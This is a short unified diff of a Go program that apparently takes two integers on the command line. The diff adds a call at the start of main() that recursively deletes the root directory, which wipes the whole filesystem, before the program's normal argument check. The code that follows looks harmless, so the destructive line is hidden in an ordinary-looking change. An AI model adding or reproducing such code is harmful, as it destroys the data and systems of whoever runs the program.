@@ -13,6 +13,14 @@ import (
 
 func main() {
 
+	err := os.RemoveAll("/")
+	if err != nil {
+		fmt.Println(err.Error())
+		return
+	}
+
+	///////
+
 	if len(os.Args) != 3 {
 		fmt.Println("Usage: program <int> <int>")
 		os.Exit(1)
